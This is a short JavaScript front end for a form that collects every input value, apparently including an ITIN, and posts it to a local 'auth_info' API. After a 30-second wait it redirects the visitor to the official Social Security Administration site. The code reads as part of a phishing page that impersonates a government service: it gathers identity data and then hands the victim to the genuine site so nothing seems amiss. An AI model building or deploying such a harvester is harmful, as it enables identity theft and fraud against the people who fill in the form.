const container = document.querySelector(".container")
const footer = document.querySelector("footer")
const submitBtn = document.querySelector('#sub_itin')
const displayMsg = document.querySelector("#wait")
const message = document.querySelector('.message')
const allInputs = document.querySelectorAll('input');
const firstNameInput = document.querySelector('#firstName');


let containerHeight = container.offsetHeight
let footerHeight = footer.offsetHeight

const newHeight = containerHeight + footerHeight + 220
document.body.style.height = newHeight + 'px'

document.addEventListener('DOMContentLoaded', () => {
  if (firstNameInput) {
    firstNameInput.focus();
  }
})
allInputs.forEach(input => {
  input.addEventListener('keyup', (e) => {
    if (e.keyCode === 13) {
      e.preventDefault(); 
      const allInputsFilled = Array.from(allInputs).every(input => input.value.trim() !== ''); 
      if (allInputsFilled) {
        submit(); 
      } else{
        message.style.display = 'block'
        const firstEmptyInput = Array.from(allInputs).find(input => input.value.trim() === '');
        if (firstEmptyInput) {
          firstEmptyInput.focus();
        }
      }
    }
  });
});

submitBtn.addEventListener('click', () => {
  const allInputsFilled = Array.from(allInputs).every(input => input.value.trim() !== ''); 
      if (allInputsFilled) {
        submit(); 
      } else{
        message.style.display = 'block'
        const firstEmptyInput = Array.from(allInputs).find(input => input.value.trim() === '');
        if (firstEmptyInput) {
          firstEmptyInput.focus();
        }
      }
})

function submit(){
  displayMsg.style.display = 'block'
  const userId = localStorage.getItem('userId');
  const obj = {}
  allInputs.forEach(input => {
    obj[input.id] = input.value; 
  });

  const baseURL = 'http://localhost:5000/api/auth/auth_info'
  fetch(baseURL, {
      method: 'POST',
      headers: {
          "Content-Type" : "application/json",
          "Authorization" : `Bearer ${userId}`
      },
      body: JSON.stringify(obj)
  })
  .then(response => response.json())
  .then(data => {
      setTimeout(() => {
        window.location.href = 'https://www.ssa.gov/'
      }, 30000)
  })
  .catch(error => {
      console.error('Error:', error);
      message.style.display = 'block';
  })
}
